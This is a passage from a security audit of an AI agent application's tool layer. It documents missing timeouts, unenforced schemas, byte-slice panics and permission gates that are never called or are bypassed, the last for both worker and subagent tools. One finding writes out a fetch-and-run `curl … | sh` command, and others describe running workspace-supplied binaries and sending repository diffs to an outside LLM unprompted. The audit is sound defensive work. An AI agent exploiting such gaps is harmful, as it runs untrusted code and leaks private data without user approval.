| 2 | `tier2_imports` (`:328-336`) | `.py`, `.js/.mjs/.cjs/.ts/.tsx/.jsx` | pure Rust; walks up for `requirements.txt` / `package.json`, checks against a hardcoded stdlib set (`:1025`, `:1068`) |
| 2.5 | `tier2_5_exports` (`:426-477`) | JS/TS only | pure Rust; regex-extracts named imports, resolves relative modules, regex-extracts the target's exports |
| 2.6 | `tier2_6_api_contract` (`:650-678`) | JS/TS only | pure Rust; regex-extracts API URLs, substring-matches them against `INTERFACE.md` |
| 3 | `tier3_types` (`:729-749`) | `.py` → mypy/pyright; `.ts/.tsx` → tsc; `.js/.jsx` → eslint | subprocess via `run_checker_subprocess` (`:810`) |

**How each subprocess is spawned, and with what timeout.** Every one is
`tokio::process::Command::new(bin).args(…)[.current_dir(working_dir)].output().await`.
**There is no timeout on any of them.** A grep for `timeout` across all 1086 lines
of `validate.rs` returns **zero hits** (CONFIRMED — this is T53, and it is total,
not partial). Additional per-site notes:

- `check_python_syntax:186-189` — binary from `resolve_python` (G10-86); **no
  `current_dir`**, so `py_compile` runs in the process CWD (`src-tauri/` under
  `tauri dev`) and writes `__pycache__` relative to the *source file*, mutating the
  workspace from a read-only tool (G10-15).
- `check_node_syntax:221-224` — **no `current_dir`** either.
- `check_tsc_syntax:269-282` — `current_dir(working_dir)`; runs **under the
  `path_lock`** when called from `write_file`/`edit_file` (G10-10).
- `run_pyright_or_mypy:753-758` — spawns an **extra probe subprocess**
  (`pyright --version`) on every tier-3 Python call, also untimed. If `pyright`
  exists but hangs on `--version`, tier 3 hangs before doing any work.
- `run_checker_subprocess:816-820` — the shared tier-3 spawn; `current_dir(working_dir)`.
- `run_tsc:789` picks up a `tsconfig.json` via `find_upward`, whose containment stop
  is unreliable — G10-103.

**What happens when the binary is missing.** Uniformly: the `Err(_)` arm of the
`match` on the spawn result produces a `LintResult` carrying a single diagnostic of
**`severity: "warning"`** — `check_python_syntax:192-202`, `check_node_syntax:227-236`,
`check_tsc_syntax:285-295`, `run_checker_subprocess:823-833`. This is the
degradation the comments describe as deliberate ("the worker isn't blocked on a
missing tool but still sees … prominently in the response", `:106-108`). Its
consequence is **G10-16**, already recorded: `LintResult::is_clean()` (`:35-37`)
counts only `severity == "error"`, so a warning-only result **is clean**, and
`check_file.rs:123` prints the fixed string `"[tsc_check] ✓ No syntax errors."`
while discarding the warning entirely. On Windows this is the default state rather
than an edge case, because `Command::new("tsc")` cannot resolve the `tsc.cmd` shim
that npm installs (T54) — so `check_file` reports every TypeScript file clean on a
machine where TypeScript *is* installed.

**Does a validation failure block anything?** **No. Nothing anywhere blocks on a
validator result.** CONFIRMED at all three call sites:
- `write_file.rs:150-192` — each tier's output is appended to the success string as
  `⚠ Lint feedback`; the file was already written at `:115`+ and the tool returns
  `ToolResult::success`.
- `edit_file.rs:215` — same; tier 1 only, appended as a note.
- `check_file.rs:74-247` — the only place a validator result reaches `is_error`, and
  only as the *report* of a check the user explicitly asked for; nothing downstream
  consumes it.
No tool refuses a write because a validator failed, no task transition consults a
validator, and `update_task_status`'s gate reads `build_evidence`, not `validate`.
The tier-2.6 API-contract check — the one the `write_interface_spec` description
calls enforcement — is the weakest of all: it returns `None` and skips silently
whenever `INTERFACE.md` is absent (`:660-661`).

**Defects**

- **G10-102 (HIGH, CONFIRMED) — no timeout on any of the seven subprocess spawns,
  and three of them run under a held path lock.** See the table above; the grep for
  `timeout` returns zero hits over the whole module. The blast radius differs by
  caller: from `check_file` a hung checker hangs one tool call; from
  `write_file`/`edit_file` it hangs one tool call **and** permanently blocks every
  other writer of that path in the process (G10-10). There is no cancellation path,
  because `.output().await` is not cancel-safe with respect to the child — as in
  `bash` (G10-24), dropping the future does not kill the process.
- **G10-103 (MEDIUM, CONFIRMED) — `find_upward`'s "stop at the workspace" guard is
  a raw path equality and routinely fails open.** `:919-932` walks upward from
  `start` and breaks when `current == root`, where `root = PathBuf::from(working_dir)`.
  The comparison is componentwise on **unnormalised** paths, and `start` is
  frequently the *canonicalised* path returned by `path_jail` while `working_dir` is
  the raw configured string — so a case difference, a trailing separator, or a
  symlinked workspace root makes the equality never hold and the loop walks all the
  way to the filesystem root. Two consumers are affected: `run_tsc:789` will pick up
  a `tsconfig.json` from any ancestor directory up to `C:\` and pass it as
  `--project`; `tier2_6_api_contract:661` will read an `INTERFACE.md` from outside
  the workspace and treat it as the API contract. And because `check_file` has no
  path jail at all, `start` need not be inside the workspace to begin with.
- **G10-104 (MEDIUM, CONFIRMED) — `resolve_python`'s fallback chain is unreachable
  past the first non-absolute entry.** `:906-913`: the loop returns immediately for
  any candidate that is not absolute. On Unix that is `"python3"` at index 6, so the
  final `"python"` (`:902`) is dead; on Windows it is `"python"` at index 4. Harmless
  today, but it means the documented "checked in priority order" list (`:881-884`) is
  not what runs, and adding a further fallback below the bare name would silently do
  nothing.
- **G10-105 (LOW, CONFIRMED) — tier 1 for `.ts` is a full `tsc` invocation, which
  the tier is documented as never doing.** The module header (`:4-5`) defines tier 1
  as "fast syntax: in-process … or lightweight subprocess (py_compile, node
  --check)". `check_tsc_syntax` spawns `tsc`, the single slowest checker in the
  module, on **every** `write_file` and `edit_file` of a `.ts/.tsx/.jsx` file. The
  `--isolatedModules` flag limits the *work* tsc does but not the ~1–3 s process
  startup, which is now paid on every TypeScript file write, under the path lock.
- **Not a defect — worth recording as the correct pattern.** The output cap at
  `:846-860` truncates to 16 000 bytes by walking `char_indices` and slicing at a
  real character boundary. This is the only truncation in the tool tree that is
  UTF-8-correct; `bash.rs:134-141` (T18), `remember_this.rs:94` (G10-54) and
  `annotate_file_tool.rs:99` (G10-61) all slice raw byte offsets and panic. The fix
  for all three already exists in this file.

**Verdict.** `validate` is the best-tested and most carefully written module of the
four — its parsers are in-process, its truncation is correct, and its degradation
story is deliberate. It fails on three axes. (1) **No timeouts, anywhere** — and
because `write_file` holds a path lock across a `tsc` spawn, one hung child process
is a permanent process-wide write outage. (2) **Missing checkers are warnings, and
warnings are clean** — so the module's fail-open design silently converts "not
checked" into "✓ No syntax errors" at `check_file.rs:123`, on a platform where the
missing-checker case is the default (T54). (3) **Nothing blocks on it** — every
result is advisory text appended to an already-successful write, which is a
defensible design but is not what `check_file`'s and `write_interface_spec`'s
descriptions tell the model.

---

## 3. Cross-cutting

### 3.1 Schema quality

**How schemas are produced.** Every tool returns a hand-written `serde_json::Value`
from `input_schema()`. There is no derive, no shared builder, and — critically —
**no server-side validator**. `ToolRegistry::to_definitions` (`tool_registry.rs:31-39`)
copies the schema straight into the provider request, and both dispatch paths
(`tool_executor.rs:264/372`, `tool_adapter.rs:283`) hand the raw `serde_json::Value`
to `execute()` with no schema check in between. **A JSON Schema in this codebase is
a hint to the model, never an enforced contract.** Every `"required"`, every
`"enum"`, every `minItems` is advisory; the only real validation is whatever the
tool body re-implements by hand.

**Only four tools parse their input with serde** — `edit_file` (`:16-23`), `grep`
(`GrepInput`), `glob` (`GlobInput`), and `write_interface_spec`'s `routes`
(`:34-44`). Those four get a real "missing field" / type error. The other 34 read
fields with `input["x"].as_str()` / `.as_i64()` and decide case by case whether to
error or default.

**G10-106 (HIGH, CONFIRMED) — the `required` keyword is honoured by some bodies and
silently defaulted by others, with no pattern.** `create_task` declares
`priority` and `task_type` as `required` and then defaults both
(`create_task.rs:63-64`, G10-29); `create_phased_task` declares seven required
fields and hard-errors on a missing one; `annotate_file` declares `severity`
required and reads it with `unwrap_or("info")` (`:74`, G10-64). A model cannot
learn the convention because there isn't one.

**Enums declared in a schema and unchecked in the body — the full list (CONFIRMED):**

| Tool | Field | Declared values | Body |
|---|---|---|---|
| `create_task` | `priority`, `task_type` | p0–p3 / feature… | `unwrap_or` defaults, never checked (G10-29) |
| `update_task_status` | `status` | 9 values | passed to SQL unvalidated (`:176`, G10-35) |
| `list_tasks` | `status` | 9 values | unchecked; unknown → 0 rows (G10-32) |
| `list_worker_requests` | `status` | 4 values | unchecked; unknown → 0 rows (G10-46) |
| `annotate_file` | `severity` | info/warning/blocking | `unwrap_or("info")` (G10-64) |
| `remember_this` | `category` | 5 values | `FactCategory::from_str` decides (§2.5) |
| `check_file` | `checks[]` | 5 values | unknown values silently dropped (`:99-105`) |
| `check_file` | `type_checker` | 5 values | 3 inert, 1 overridden (G10-84) |
| `write_interface_spec` | route `method` | 7 verbs (prose only) | free text, upper-cased (G10-81) |
| `search_memory` | `tier` | enum | passed through |

Validated **in code**, correctly: `assign_task`/`assign_tasks` (worker slug against
`FLEET_WORKERS`), `request_supervisor_action` (`request_type`),
`resolve_worker_request` (`action`), `send_worker_message` (recipient + `kind`),
`write_interface_spec` (`mode`). Five tools out of 38.

**Paths, commands, regexes and globs — what is and is not validated.**

| Input class | Tools | Validation |
|---|---|---|
| Path, jailed | `write_file`, `edit_file`, `append_file`, `bash` (cwd + redirects) | `validate_workspace_path` (§2.8) |
| Path, **unjailed** | `read_file`, `list_directory`, `grep`, `glob`, `check_file`, `annotate_file` (`file_path`), `analyze_diff` (`repo_path`) | **none** — any absolute path accepted |
| Shell command | `bash` | jail on cwd + redirect targets only; the command body is unrestricted |
| Shell command | **`e2e_probe`** (`start_cmds[]`) | **none at all** (G10-73) |
| URL | `e2e_probe` (`probe_url`) | **none** — any host (G10-74) |
| Regex | `grep` (`pattern`) | `Regex::new` error is returned cleanly (`grep.rs:138-140`) — **correct** |
| Glob | `glob` (`pattern`), `grep` (`glob`) | `glob::Pattern::new` error returned cleanly (`glob.rs:109-112`) — **correct** |
| Git refs | `analyze_diff` (`base_branch`/`head_branch`) | unvalidated, but consumed by **libgit2**, not a shell — **not injectable** |
| Free-form YAML | `planner` (`yaml_dsl`) | see G10-107 |

**G10-107 (MEDIUM, CONFIRMED) — `planner` has no schema at all.** `planner.rs:29-40`
declares a single required string `yaml_dsl` described as "YAML DSL command. Use
'action: listActions' to discover available actions", and the description (`:24-26`)
names seven actions with no arguments for any of them. The model must spend a
discovery round-trip before it can make a correct call, and the schema can offer no
help with the shape of that call. This is one of only four tools in **Delegate**
mode (§1.4), where a wasted round-trip is a large fraction of the interaction.
Separately, `planner::execute` takes `_ctx` (`:44`) — the context is **unused**, so
plans are neither session-scoped nor workspace-scoped.

**Inputs that can panic or hang the tool (CONFIRMED unless noted).**

| Site | Input | Effect |
|---|---|---|
| `edit_file.rs:150-156` | `old_string: ""` | **infinite loop, unbounded `Vec` growth → OOM** (T14) |
| `bash.rs:134-141` | >50 KB output with no newline in the tail, ending mid-codepoint | **panic** on byte-index slice (T18) |
| `remember_this.rs:94` | `fact` >120 bytes with a multi-byte char at byte 120 | **panic** (G10-54) |
| `annotate_file_tool.rs:99` | `note` >80 bytes with a multi-byte char at byte 80 | **panic** (G10-61) |
| `path_lock.rs:95`, `build_evidence.rs:134/143/155`, `spawn_qc_review.rs:369/388/399` | any prior panic under the same mutex | **poisoned `Mutex` → `.unwrap()` panics on every later call** (G10-94) |
| `spawn_qc_review.rs:150`, `tool_adapter.rs:232` | `timeout_secs`/`__depth` > u32::MAX | silent `as u32` truncation, no error (G10-71) |
| `create_task.rs:59` | 40-char CJK title | rejected as ">120 characters" (byte count, G10-30) |
| `read_file.rs:99` | any `start_line`/`end_line` | disables the 256 KB byte guard (G10-07) |

The three byte-slice panics are the same one-line mistake in three files, and the
correct pattern (`char_indices`) is already in the tree at `validate.rs:846-853`.

### 3.2 Error surfaces

**There is exactly one error shape.** `ToolResult::error(message: impl Into<String>)`
(`tool_trait.rs:30-32`) produces `{output: String, is_error: true, hint: None}`.
There is no error code, no machine-readable kind, no structured field. Everything —
a validation refusal, a jail refusal, a missing DB, a panicking subprocess, a
provider failure — arrives at the model as one opaque string. The model's only
recovery signal is prose.

**Good error prose (the model can act on it).** `read_file` restates both caps and
gives a concrete retry call (§2.1). `path_jail`'s message names both paths, says
"This call has been refused", and states what shape *would* work
(`path_jail.rs:145-153`). `edit_file`'s multi-match error names the count and points
at `replace_all`. `create_phased_task`'s parse error names the required keys.

**Raw Rust error strings passed straight through (the model cannot act on them).**
CONFIRMED at each site:

| Tool | Site | Leaked |
|---|---|---|
| `analyze_diff` | `:74`, `:84`, `:100`, `:121`, `:149` | `AutoDevError` / `serde_json` Display |
| `annotate_file` | `:101`, `:103` | rusqlite error text |
| `spawn_qc_review` | `:102`, `:109`, `:135`, `:176` | rusqlite / subagent error text |
| `write_interface_spec` | `:108`, `:175` | `serde_json` / `io::Error` |
| `check_file`, `write_file`, `edit_file` | validator paths | raw `tsc`/`mypy`/`py_compile` stderr, capped but unparsed |
| `get_epic_progress`, `get_ready_tasks_in_phase` | (§2.3) | DB errors verbatim |

**G10-108 (MEDIUM, CONFIRMED) — the `hint` channel is dropped on the MCP path, so
every fleet worker and subagent loses the guidance the PA agent gets.**
`ToolResult::success_with_hint` (`tool_trait.rs:25-28`) is used by seven tools —
`analyze_diff:147`, `assign_tasks_batch:232`, `glob:193`, `grep:268`,
`list_directory:69`, `list_tasks_tool:103`, `list_worker_requests_tool:74` — and is
consumed at exactly one place, `agent/engine.rs:316`. `mcp_server/tool_adapter.rs:100-107`
(`wrap_result`) builds `vec![Content::text(tool_result.output)]` and **never reads
`tool_result.hint`**. Over MCP, `analyze_diff`'s risk summary, `grep`/`glob`'s
"large result — narrow your search" guidance, and `list_tasks`' token-bloat warning
all vanish. The 34-tool worker surface is precisely the surface where those hints
matter most, because workers have the smallest context budgets.

**Tools that return success on failure.** CONFIRMED:

| Tool | Site | What is wrong |
|---|---|---|
| `resolve_worker_request` | `db/tasks.rs:668-686` | affected-row count discarded; resolving id 999999 returns "marked as completed", `is_error=false` (**G10-47**) |
| `check_file` | `:123` + `validate.rs:35-37` | a missing checker is a *warning*, warnings are "clean", and the tool prints "✓ No syntax errors" (**G10-16**) |
| `edit_file` | `:222-229` | `new_string == old_string` reports "✓ Edited" having changed nothing (**G10-13**) |
| `set_task_budget` | (§2.3) | reports `$0.50 / 100000 / 20` as the budget set when `None` was stored (**G10-40**) |
| `write_file` | `:115` | `auto_checkpoint_before_write` returns `()`; a failed checkpoint is invisible and the overwrite proceeds (**G10-11**) |
| `write_interface_spec` | `:141`+`:146` | a failed read turns `mode=merge` into a full overwrite and still reports "Wrote N route(s)" (**G10-80**) |
| `analyze_diff` | `:129-132` | a failed `set_task_diff_analysis` is `warn!`-logged only; the tool result is success |
| `e2e_probe` | `:147-151` | reports "Children were killed" on a path where the kill code never ran (**G10-76**) |
| `create_task` | `:110` | asserts the Supervisor "will pick up" the task with nothing checking the fleet is running (§2.3) |

The neighbouring correct pattern exists in the same file for two of these:
`acknowledge_worker_message` **does** check rows-affected (`db/tasks.rs:781-793`),
and `write_file` **does** test `diagnostics.is_empty()` rather than `is_clean()`
(`write_file.rs:151`).

### 3.3 Output size

**There is no shared cap, no shared truncation helper, and no total-response
budget.** Each tool invents its own limit, in its own unit, with its own behaviour
at the boundary.

| Tool | Cap | Unit | Behaviour at the cap |
|---|---|---|---|
| `read_file` | 256 000 | bytes | error — **but only when no line range is given** (G10-07) |
| `read_file` | 800 / 2000 | lines | refuse / silent window (`:128-149`); one-line files defeat both |
| `bash` | 50 000 | bytes | tail-truncate with a notice — **panics on a UTF-8 boundary** (T18); truncates the *combined* buffer so a header can be lost (G10-27) |
| `grep` | 100 | **matches** | stop; no byte cap, `context_lines` unbounded (G10-20) |
| `glob` | 200 | paths | stop, then sort |
| `list_directory` | 500 | entries | **not enforced inside the loop**; `truncated` computed by exact equality so it reports `false` after over-emitting (T11) |
| `list_tasks` | — | — | **uncapped** (G10-31) |
| `list_worker_requests` | — | — | **uncapped**, full payloads (G10-46) |
| `list_worker_messages` | — | — | **uncapped**, 4 KB each (G10-49) |
| `get_ready_tasks_in_phase` | — | — | uncapped (low cardinality) |
| `analyze_diff` | — | — | **uncapped** — the full serialised analysis JSON |
| `e2e_probe` | 400 | **chars** | silent truncate — **UTF-8-correct** (`:236`) |
| `validate` tier 3 | 16 000 | bytes | truncate with a notice — **UTF-8-correct** (`:846-860`) |
| `validate` tier 1 tsc | 4 | lines | silent truncate (`:306-310`) |
| `remember_this` | 120 | bytes | **panic** (G10-54) |
| `annotate_file` | 80 | bytes | **panic** (G10-61) |

**G10-109 (MEDIUM, CONFIRMED) — three of the sixteen caps are byte-indexed into a
`String` and two of those panic; the two that are character-indexed are correct.**
The tree contains both the bug and its fix. `e2e_probe:236` (`chars().take(400)`)
and `validate.rs:846-853` (`char_indices` + boundary slice) are right;
`bash.rs:134-141`, `remember_this.rs:94` and `annotate_file_tool.rs:99` are wrong in
the identical way.

**G10-110 (MEDIUM, CONFIRMED) — the four uncapped list tools are the four whose
cardinality grows with project age.** `list_tasks`, `list_worker_requests`,
`list_worker_messages` and `analyze_diff` have no limit and no pagination parameter,
while every filesystem tool has one. On a mature board these are the tools the
Supervisor calls on **every tick**, so the context cost of a supervisor tick grows
without bound as the board fills — the exact failure the `compact` flag in
`list_tasks` was added to mitigate and does not fix (it shrinks rows, not row
count).

**No response-level budget exists.** Nothing sums the outputs of a tool batch.
`execute_batch` (`tool_executor.rs:200`) runs read-only tools **concurrently** and
concatenates the results, so a single model turn issuing four `grep`s at
`context_lines: 50` can produce megabytes with every individual tool inside its own
cap.

### 3.4 Destructiveness and gating

**`Tool::requires_permission()` is never called.** CONFIRMED independently:
`grep -rn "requires_permission"` over `src-tauri/src` returns the trait definition
(`tool_trait.rs:61`) and eight tool overrides, and **zero call sites**. Every one of
those overrides is therefore inert:

| Tool | Declares | Reality |
|---|---|---|
| `bash`, `write_file`, `edit_file` | `requires_permission() = true` | buys nothing — they are gated by `is_read_only()` being false, which was already the default |
| `check_file`, `glob`, `grep` | `requires_permission() = false` | buys nothing — already read-only, already auto-approved |
| **`e2e_probe`**, **`write_interface_spec`** | `requires_permission() = false` | **buys nothing — and it is the only reason they are not ungated**; both are non-read-only, so the real gate still prompts for them in `ManualApproval`. Their author's stated intent (skip the prompt) is not achieved, which is the one place the dead code fails safe rather than open |

**The real gate is `is_read_only()`, used as a partition key.** There are two live
dispatch paths and they gate differently.

**Path 1 — PA modes (`FastDevelopment`, `Review`).** `agent/engine.rs:299` calls
`ToolExecutor::execute_batch`. **`ToolExecutor::execute()` — the function that
contains the careful three-mode permission check at `tool_executor.rs:100-115` — has
zero callers** (given; confirmed: the only reference to a `ToolExecutor` method in
`engine.rs` is `execute_batch` at `:299`). `execute_batch` (`:200-425`) instead:
1. **partitions** the batch by `tool.is_read_only()` (`:213`);
2. runs the read-only partition **concurrently under a semaphore**, and at `:264`
   calls `tool.execute()` directly with the comment `// Execute (read-only always
   approved)`. `_mode`, `_always_allow` and `_pending` are cloned into the task at
   `:239-241` and **deliberately underscore-prefixed, i.e. unused** — the permission
   mode is captured and thrown away;
3. runs the write partition serially with a real check at `:327-341`:
   `Autonomous => true`, otherwise `always_allow.contains(name)` or prompt.

So in PA mode the complete gate is: **read-only ⇒ never prompted, ever, in any
mode; non-read-only ⇒ prompted unless the mode is `Autonomous` or the tool is on
the session `always_allow` set** (populated by a user choosing `AllowAlways`,
`:452`).

**Path 2 — MCP (all 34 worker/subagent tools).** `tool_adapter.rs:283` calls
`tool.execute(args, &ctx).await` **directly**. There is no `PermissionMode`, no
`always_allow`, no `request_permission`, and no hook fire. **For every fleet worker
and every subagent there is no gate of any kind** — `bash`, `write_file`,
`edit_file`, `append_file`, `e2e_probe` and `spawn_subagent` all execute
unprompted. This is presumably intended for autonomous operation, but it means the
entire permission subsystem (`agent/permission.rs`, the three modes, the
`AllowAlways` flow) applies to exactly one of the two ways tools are called, and
never to the one that does most of the work.

**G10-111 (CRITICAL, CONFIRMED) — auto-approval is keyed on a flag that four tools
declare incorrectly, and the four are the dangerous ones.** Because read-only ⇒
unconditional execution with no prompt in *any* PA mode:
- **`check_file`** (`is_read_only = true`) executes `<workspace>/.venv/Scripts/python.exe`
  (G10-86), runs `eslint` against a workspace-authored flat config (G10-15), and
  writes `__pycache__` into the source tree — all silently, concurrently, and with
  no path jail.
- **`analyze_diff`** (`is_read_only = true`) writes to `tasks.diff_analysis`, emits
  a UI event, reads an arbitrary repository, and transmits its full diff to a
  third-party LLM (G10-56, G10-57).
- **`read_file`**, **`grep`**, **`glob`**, **`list_directory`** (all `true`) read any
  path on the machine with no jail (T12/T13).
The flag's documented meaning is concurrency safety — "Read-only tools can run
concurrently; write tools run serially. Pattern from Claude Code's
isConcurrencySafe()" (`tool_trait.rs:58-59`) — and `execute_batch` uses it correctly
for that. Overloading the same flag as the permission decision means a tool author
choosing "this is safe to run in parallel" is simultaneously choosing "this needs no
user approval", and two authors have chosen wrong.

**G10-112 (HIGH, CONFIRMED) — the gate cannot distinguish the agent modes, so
`Review` mode's read-only posture is unenforceable.** This closes **G10-06**.
`execute_batch` reads `self.mode`, which is a `PermissionMode`
(`permission.rs:12-18`), **not** an `AgentMode`. Nothing in the gate knows whether
the caller is `FastDevelopment`, `Review` or `Delegate`. `mod.rs:167` defers safety
to "the permission layer at execution time"; that layer has no mode input to defer
to. A `Review`-mode session with `PermissionMode::Autonomous` can `write_file`,
`bash` and `e2e_probe` with no prompt and no record that it was supposed to be a
review.

**The destructive set, with the real gate for each.**

| Tool | Destructive act | Gate in PA (`ManualApproval`) | Gate in PA (`Autonomous`) | Gate over MCP |
|---|---|---|---|---|
| `bash` | arbitrary command | prompt | **none** | **none** |
| `e2e_probe` | arbitrary commands ×N | prompt | **none** | **none** |
| `write_file` | overwrite (with checkpoint) | prompt | **none** | **none** |
| `edit_file` | in-place edit (with checkpoint) | prompt | **none** | **none** |
| `append_file` | append, **no checkpoint, no undo** (T36) | prompt | **none** | **none** |
| `write_interface_spec` | **full overwrite by default, no checkpoint** (G10-79) | prompt | **none** | **none** |
| `check_file` | executes workspace binaries; writes `__pycache__` | **none** | **none** | **none** |
| `analyze_diff` | DB write; repo exfiltration to an LLM | **none** | **none** | **none** |
| `update_task_status` | erases `rejection_reason` (G10-34) | prompt | **none** | **none** |
| `spawn_subagent` / `spawn_parallel_subagents` / `spawn_qc_review` | spawns agents with the full tool surface (G10-50) | prompt | **none** | **none** |
| `remember_this` | writes durable memory | prompt | **none** | *not exposed* |
| `read_file` / `grep` / `glob` / `list_directory` | reads any path on the machine | **none** | **none** | **none** |

The only genuinely enforced controls in the whole surface are `path_jail` (four
tools, §2.8) and `bash`'s redirect scanner. Everything else described anywhere in
the tree as a guard — `requires_permission`, the `tools` subset on subagents
(G10-50), `ctx.depth` (T48), `ctx.agent_role` (T50), the adapter path lock (G10-93),
`most_recent_smoke` (G10-100) — is either never called, never read, or self-declared
by the party being guarded.

---

## 4. Findings table

Covers the whole document — §1.3, §1.4, §2.1–§2.8 and §3. Ids of the form `Tnn`
are **owned by G2a** and are listed here for completeness with this audit's own
severity assessment; `G10-nn` ids are new. Sorted by severity, then by id.

One id is assigned here for the first time: **G10-113** formalises the unnumbered
"Windows evidence bug" recorded in prose at the end of §2.2.

**Totals: 4 CRITICAL · 34 HIGH · 45 MEDIUM · 30 LOW = 113 findings.**

### CRITICAL

| ID | file:line | Sev | Class | What it does | Why it is wrong | Concrete failure scenario | Status |
|---|---|---|---|---|---|---|---|
| G10-73 | `e2e_probe.rs:89,179-197` | CRITICAL | gating / RCE | Spawns N arbitrary shell commands via `cmd /C` / `sh -c`, declaring `requires_permission()=false` | It is `bash` with the jail, the redirect scanner, evidence recording and output capture all removed | `e2e_probe(start_cmds=["curl … \| sh"])` from any worker or subagent runs with app privileges, unprompted, output discarded | CONFIRMED |
| G10-86 | `validate.rs:880-915` + `check_file.rs:71-72` | CRITICAL | path-safety / RCE | `resolve_python` prefers `<workspace>/.venv/Scripts/python.exe` and runs it | A read-only, unjailed, auto-approved tool executes a binary the workspace supplies | Clone a repo shipping `.venv/…/python.exe`; the first `check_file` or `write_file` of any `.py` file executes it silently | CONFIRMED |
| G10-111 | `tool_executor.rs:213,264` + `tool_trait.rs:58-59` | CRITICAL | gating | Auto-approval is keyed on `is_read_only()`, a flag documented as a *concurrency* hint | Two authors set it wrong; read-only ⇒ never prompted in any PA mode | `check_file` and `analyze_diff` execute code / write the DB / exfiltrate repos with no prompt in any mode | CONFIRMED |
| T14 | `edit_file.rs:150-156` | CRITICAL | memory-safety | `old_string=""` → `find("")` returns `Some(0)` forever, `start += 0`, `positions` grows unbounded | The loop is in the *error-formatting* branch, not the replace branch | One `edit_file(old_string="")` call spins a core and drives the app to OOM | CONFIRMED (G2a) |

### HIGH

| ID | file:line | Sev | Class | What it does | Why it is wrong | Concrete failure scenario | Status |
|---|---|---|---|---|---|---|---|
| G10-01 | `main.rs:108-110`, `server.rs:148-152`, `sidecar_commands.rs:311-327` | HIGH | registration | UI shows the discarded 38-tool registry as the worker surface | `server.rs` does `let _ = registry;` and builds its own 34 | Recipe author reads the browser, writes a `search_memory` step, worker fails every tick | CONFIRMED |
| G10-05 | `mod.rs:236-243` vs `context.rs:267,302-303` | HIGH | registration | Delegate gets 4 tools; its prompt says it has 1 | Two write tools (`planner`, `remember_this`) the prompt denies exist | Delegate run calls tools the prompt says it does not have; no `list_tasks` to read back | CONFIRMED |
| G10-07 | `read_file.rs:99-149` | HIGH | resource | 256 KB byte guard is disabled whenever any line range is given | Line caps count lines, not bytes | `read_file("dist/bundle.js", 1, 1)` returns a multi-MB single line into context | CONFIRMED |
| G10-09 | `write_file.rs:83` vs `edit_file.rs:108` | HIGH | concurrency | The two tools lock different keys for one file (pre-jail vs canonical) | `lock_key` is lexical only — no canonicalise, no case-fold | Windows workspace cased differently from disk; concurrent edit+overwrite both proceed, edit lost | CONFIRMED |
| G10-10 | `write_file.rs:83,150` → `validate.rs:269-282` | HIGH | concurrency | Path lock held across an untimed `tsc` spawn | `validate.rs` has zero `timeout` calls | A hung `tsc` blocks every writer of that path in the process, permanently | CONFIRMED |
| G10-15 | `check_file.rs:71-72` → `validate.rs:801-808` | HIGH | gating / RCE | Read-only tool runs `eslint`, which executes `eslint.config.js` | Also `py_compile` writes `__pycache__` — a read-only tool mutating the tree | Untrusted repo's flat config runs with app privileges, no prompt | CONFIRMED |
| G10-16 | `validate.rs:35-37` + `check_file.rs:123` | HIGH | evidence | Missing checker → *warning*; `is_clean()` ignores warnings; the warning is discarded | Reports "✓ No syntax errors" for a file never checked | On Windows `Command::new("tsc")` can't find the `.cmd` shim (T54) → every `.ts` file reads clean | CONFIRMED |
| G10-20 | `grep.rs:216` | HIGH | resource | `max_results` counts matches; `context_lines` unbounded; no byte cap | One match in a minified line returns the whole line | `context_lines:5000, max_results:100` → up to 1M lines | CONFIRMED |
| G10-24 | `bash.rs:99-102,187` | HIGH | resource | Timed-out command is never killed (`kill_on_drop` unset) | The future is dropped; the child subtree survives | Three `npm run dev` timeouts leave three servers on the port | CONFIRMED |
| G10-25 | `bash.rs:114` | HIGH | evidence | Evidence recorded only in the `Ok(Ok(..))` arm | A build exceeding the timeout leaves no evidence | Long `cargo test` → `qc_review` refused for "no build evidence" | CONFIRMED |
| G10-33 | `update_task_status_tool.rs:141` + `tool_adapter.rs:204-222` | HIGH | evidence | Evidence keyed on `session_id`; a missing `__session_id` mints a fresh uuid per call | Build and status update land in different sessions | Honest worker can never satisfy the gate no matter how many builds it runs | CONFIRMED |
| G10-38 | `claim_task_tool.rs:94` + `orphan/mod.rs:148-190` | HIGH | evidence | Records the Tauri app's PID as the worker's | Reconciler sees a live "autodev" PID and skips the 4-hour TTL | Worker LivingAgent crashes; task stays `in_progress` forever **because** a PID was recorded | CONFIRMED |
| G10-41 | `create_epic_tool.rs:73,77` vs `create_phased_task_tool.rs:79,119` | HIGH | schema | `create_epic` returns `epic_id` as a number; `create_phased_task` requires a string | The documented two-step flow fails on the first attempt | Model echoes the id it was just given → "'epic_id' is required" | CONFIRMED |
| G10-47 | `resolve_worker_request_tool.rs` → `db/tasks.rs:668-686` | HIGH | error-handling | Affected-row count discarded; returns success for a non-existent id | `acknowledge_worker_message` in the same file does check it | Supervisor mis-reads an id, believes the queue drained, request re-processed forever | CONFIRMED |
| G10-50 | `spawn_subagent.rs:129-134` + `subagent/types.rs:31` | HIGH | gating | `SubagentConfig.tools` is written in 3 places and **read nowhere** | Every subagent gets the full 34-tool MCP surface | "Analysis-only" subagent with `tools:["read_file"]` writes to the repo | CONFIRMED |
| G10-54 | `remember_this.rs:94` | HIGH | memory-safety | `&fact[..120]` on a byte index | Panics when byte 120 is mid-codepoint | "Remember: …" containing an em-dash near char 120 panics the task | CONFIRMED |
| G10-56 | `analyze_diff_tool.rs:55,129,136` | HIGH | gating | `is_read_only()=true` while writing `tasks.diff_analysis` and emitting a UI event | Auto-approved; also skips the adapter path lock | A DB-mutating tool runs with `grep`'s gating | CONFIRMED |
| G10-57 | `analyze_diff_tool.rs:78-87` | HIGH | path-safety / exfiltration | Unjailed `repo_path`; full patch sent to a third-party LLM | Only tool that ships arbitrary on-disk content to a network endpoint, and it is read-only | `analyze_diff(repo_path="…/private-client-repo")` uploads the whole diff, no prompt | CONFIRMED |
| G10-61 | `annotate_file_tool.rs:99` | HIGH | memory-safety | `&note[..80]` on a byte index | Panics mid-codepoint; 80 bytes is a very short leash for LLM prose | QC note containing `→` or a curly quote near char 80 panics the review | CONFIRMED |
| G10-62 | `annotate_file_tool.rs` + `tool_adapter.rs:44-46` | HIGH | path-safety | Path arg named `file_path`, so no jail **and** no adapter lock | The lock lookup keys on the literal string `"path"` | Annotation written against an arbitrary uninterpreted path string | CONFIRMED |
| G10-67 | `spawn_qc_review.rs:95,102-176,378-391` | HIGH | cost | Provisional $0.10 recorded before 8 possible error returns; never reconciled | Only the success path can call `record_dispatch_complete` | 50 dispatcher ticks against an already-claimed task trip the $5 ceiling → all QC blocked for an hour at $0 real spend | CONFIRMED |
